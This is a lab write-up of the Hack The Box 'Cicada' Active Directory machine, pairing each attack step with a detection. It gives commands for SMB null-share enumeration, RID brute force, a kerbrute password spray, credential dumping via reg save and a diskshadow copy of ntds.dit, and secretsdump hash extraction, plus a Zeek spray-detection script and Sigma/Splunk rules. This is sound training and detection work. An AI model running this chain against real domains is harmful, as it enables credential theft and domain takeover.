description: Windows Active Directory box showcasing multiple credential exposure issues. I use a Zeek script to detect a password spray attack and Sysmon coupled with Splunk to review the privilege escalation vectors.
---

### Overview

The premise for the machine uses an SMB share with "null" or "anonymous" authentication access as a way to disseminate a default password for Cicada Corporation's new hires. With that default password I was able to conduct a password spray and see one user did not change their password. This leads to uncovering more passwords with an LDAP query and re-enumerating SMB access. The SeBackupPrivilege was later used to extract the local Administrator's NT hash and domain database hashes. I spent some time learning to write a Zeek script for Kerberos password spray detection and using Splunk, Sysmon, and Sigma to detect privilege escalation.

### Attack Tactics

#### Reconnaissance
Looking at the nmap results the machine seemed to be a domain controller given port 53 (DNS), 88 (Kerberos), 445 (SMB), 389, 636, 3268, 3269 (LDAP) being open. I chose to start with SMB and after running through standard checks see that null/anonymous access is allowed to read a non-standard `HR` share:

From here I did some enumeration with `smbmap` and then pulled down the `Notice from HR.txt` to see the default password:
```
smbmap -H $IP -u 'notarealaccount' -r HR --depth 4 -A Notice
```
There's a process and policy issue here where the same password should not be used even if it's intended to be temporary for new hires. A better approach would be for new employees to get assigned random passwords and be forced to change them after first login.

The commands as documented in this [blog](https://dirteam.com/sander/2021/09/22/hardening-smb-on-domain-controllers-step-3-disabling-smb-null-sessions/) are below in a one-liner to disable SMB null access. After running these I restarted the machine for the changes to take effect.
```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name RestrictAnonymous -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name RestrictAnonymousSAM -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name EveryoneIncludesAnonymous -Value 0 -PropertyType DWORD -Force
```
Error received when trying null access after the prevention measure:

#### Credential Access
##### Password Spray
With the default password known I can perform a password spray attack but need a list of valid accounts first. Even with guest/anonymous SMB access I could perform a RID brute force to get that users list. I chose to use `NetExec` (alias: `nxc`) for that:
```
nxc smb $IP -u 'guest' -p '' --rid-brute 8000
```

From here `kerbrute` was used for the password spray and I discovered one account still using the default password:
```
./kerbrute passwordspray -d cicada.htb --dc $IP users.txt 'Cicada$M6Corpb*@Lp#nZp!8' -v
```
> __Detect:__ Looking at the pattern of kerberos connections on the network for kerbrute's password spray is one way to detect this.
{: .prompt-tip}
```
cat krb_pass_spray.log | zeek-cut attacker victim unique_accounts
10.10.14.204    10.129.189.115     5
```
More detail on the script I used is discussed [below](#zeek-script) however, it was my first attempt at writing a Zeek script so I'm sure improvements can be made.

The password spray could also easily be done with `NetExec` and SMB. Zeek records this activity in an `ntlm.log`. The process to adapt or write a different script for this seems similar based on logged output.
![image](https://i.postimg.cc/1X1M9DRZ/cicida-nxc-spray.png){: width='1042' height='183'}
Looking at associated Zeek output with `zeek-cut` for specific fields:
```
cat ntlm.log | zeek-cut ts id.orig_h id.orig_p id.resp_h id.resp_p username success
```
![image](https://i.postimg.cc/7638rppH/cicada-ntlmlog.png){: width='782' height='161'}
When looking at the above output I thought it was peculiar that the first entry had a blank username matched with `T` for the success field that didn't seem to correspond to the `NetExec` output. I checked the associated packet capture which confirmed the success packet and blank username and domain fields:
![image](https://i.postimg.cc/2y5Dd0KC/cicda-nxc-pcap.png){: width='1666' height='656'}
I assumed this was something builtin to `NetExec`, possibly related to the first output line showing version, name, and domain info. I searched for "build" in the Packet details as a String in Wireshark and saw where the Build number is returned a couple packets before the previous STATUS_SUCCESS response:
![image](https://i.postimg.cc/XJ6FBZxg/cicada-build.png){: width='496' height='96'}

Then searching through [NetExec](https://github.com/Pennyw0rth/NetExec) for "version" I came across this import statement:
```python
from impacket.smb3 import WIN_VERSIONS
```
From [here](https://github.com/fortra/impacket/blob/master/impacket/smb3.py#L123) you can see the `WIN_VERSIONS` dictionary matching Build keys to Windows version values. Based on the packet capture timing and what the code is doing that first blank Success seems to correlate with gathering the machine details. 

##### Unsecured Credentials: LDAP
With Michael's account password an authenticated LDAP search can reveal a password stored in the "description" for another user.
```
ldapsearch -x -H ldap://$IP -D 'cicada\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" > ldap.out
```
This can also easily be accomplished yet again with `NetExec`.

##### Unsecured Credentials: Script 
Then with David's password the other non-standard SMB share `DEV` is accessible containing a `Backup_script.ps1` which has plain-text credentials for Emily's account. Both of these credential exposures would be more challenging to detect without context of the prior events since legitimate credentials are being used.

#### Initial Access and Privilege Escalation
Checking additional access with Emily's account it's seen that WinRM and `evil-winrm` can be used for shell access. As typical with Windows access I'll check privileges and could see the `SeBackupPrivilege` enabled. This access was then leveraged to save a copy of the SAM and SYSTEM hives:
```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```
> __Detect:__ The `reg` process events can be detected using Sysmon and Splunk as an example. This [sigma rule](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives/) was also used for this effort.
{: .prompt-tip}
![image](https://i.postimg.cc/50wDMQjQ/cicada-reg-save.png){: width='1437' height='499'}
I used [Uncoder's](https://uncoder.io/) site for the Sigma rule translation to Splunk's query language. The first portion containing `source=WinEventLog:Security` was changed to `index="sysmon"` to match how I setup the Sysmon index. The Sysmon and Splunk installs were relataively straightforward, the main things that differed from the [install steps here](https://github.com/chrisdfir/sysmon2splunk) were:
1. I wanted to keep my attacking machine (Kali VM) and Splunk server (Ubuntu VM) separate. With Kali connected to the Hack The Box OpenVPN tunnel I configured the Cicada machine's Splunk Forwarder to send to my Kali machine on port 7999 and then Kali forwards those connections to the Ubuntu Splunk server on 9997 with `socat`:
```
socat TCP4-LISTEN:7999,fork TCP4:<SPLUNK_SERVER_IP>:9997
```
2. The `inputs.conf` content were accurate however, I had to update the file at this path: `C:\program files\splunkuniversalforwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf`.

With Cicada being a domain controller gaining access to the `ntds.dit` file can provide hashes for the entire domain. I followed the steps from [hackingarticles.in](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) to use a distributed shell file along with the `diskshadow` utility:

Create `emily.dsh`:
```
set context persistent nowriters
add volume c: alias emily 
create
expose %emily% z:
```
Convert file encoding for Windows:
```
unix2dos emily.dsh
```
Then run `diskshadow`:
![image](https://i.postimg.cc/nhGkZK1J/cicada-diskshadow.png){: width='858' height='473'}

The built-in `robocopy` utility is then used to copy `ntds.dit`.
```
robocopy /b z:\windows\ntds . ntds.dit
```

With both versions of privilege escalation, `SAM` and `ntds.dit`, the `SYSTEM` file is needed to decrypt hashes. Impacket's `secretsdump.py` was used to dump hashes locally after copying respective files (using the Kali installed version here that prepend "impacket"):
```
impacket-secretsdump -sam sam -system system LOCAL

impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

> __Detect:__ As a separate detection example for `diskshadow` this [Sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_diskshadow_script_mode.yml) simply looks at process execution with the `s` parameter, to accept scripts. The other Sigma rule will also check for similar common usage of saving the SYSTEM hive with `reg`.

Again, using Uncoder to translate Sigma's general syntax to a usable Splunk variant:

### Zeek Script
The idea for the script was to:
1. Look for Kerberos Pre-Authentication failed events
2. Check if a subsequent failed event occurs within a time threshold
3. Look for these events to be sourced from and destined to the same IP addresses
4. Verify authentication attempts are to different accounts

The time threshold between events `ts_delta` and `log_threshold` values were set to easily trigger a detection for this box. Only 5 events to trigger a log may be rather low but needed in this case with Cicada's domain only having 8 accounts. I also used an arbitrary factor of 5 to multiply the `log_threshold` each time as a way to minimze log fatigue. I tested the script on another lab machine with hundreds of accounts and it worked as expected but I'd expect it would need to be adjusted for production environments with many more accounts. I'm not sure how performant the script's `client` set would handle continual checks of unique accounts against thousands accounts for example.

```bash
module krb_pass_spray;

# Declare initial global variables
export
{
    redef enum Log::ID += { krb_pass_spray::LOG };

    global counter: count = 0;
    global log_threshold: count = 5;
    global init_time: time;
    global init_orig_h: addr;
    global init_resp_h: addr;
    global clients: set[string];

    type Info: record
    {
        ts: time &log;
        attacker: addr &log;
        victim: addr &log;
        unique_accounts: count &log;
    };
}

event zeek_init()
    {
        Log::create_stream(LOG, [$columns=Info, $path="krb_pass_spray"]);
    }

event krb_error(c: connection, msg: KRB::Error_Msg)
{
    # Check for error 24/KDC_ERR_PREAUTH_FAILED
    if ( c$krb$error_code == 24 && counter == 0 )
    {
        counter = 1;
        # Store initial PREAUTH FAILED fields for comparison
        init_time = c$krb$ts;
        init_orig_h = c$krb$id$orig_h;
        init_resp_h = c$krb$id$resp_h;
        add clients[c$krb$client];
    }
    # Check for subsequent error 24s
    else if ( c$krb$error_code == 24 && counter > 0 )
    {
        # Check time interval between subsequent error 24s
        local ts_delta = | c$krb$ts - init_time |;
        init_time = c$krb$ts;

        if ( ts_delta < 2.5 )  # rough/conservative doubling of max time interval between error 24 events from Kerbrute example against Cicada
        {
            # First pair of events indicating suspected TP
            if ( init_orig_h == c$krb$id$orig_h && init_resp_h == c$krb$id$resp_h && c$krb$client !in clients && counter == 1 )
            {
                add clients[c$krb$client];
                counter = 2;
            }
            # Subsequent suspected TP events
            else if ( init_orig_h == c$krb$id$orig_h && init_resp_h == c$krb$id$resp_h && c$krb$client !in clients && counter > 1 )
            {
                add clients[c$krb$client];
                counter += 1;
                if ( counter == log_threshold )
                {
                    Log::write(LOG, Info($ts=network_time(),
                                         $attacker=c$krb$id$orig_h,
                                         $victim=c$krb$id$resp_h,
                                         $unique_accounts=counter));
                    log_threshold = log_threshold * 5;
                }
            }
            # Criteria for TP not found in consecutive error 24 events, reset counter
            else if ( counter == 1 )
            {
                counter = 0;
            }
        }
        # Time interval between error 24s too large/not indicitive of automated attack, reset counter
        else
        {
            counter = 0;
        }
    }
}
```
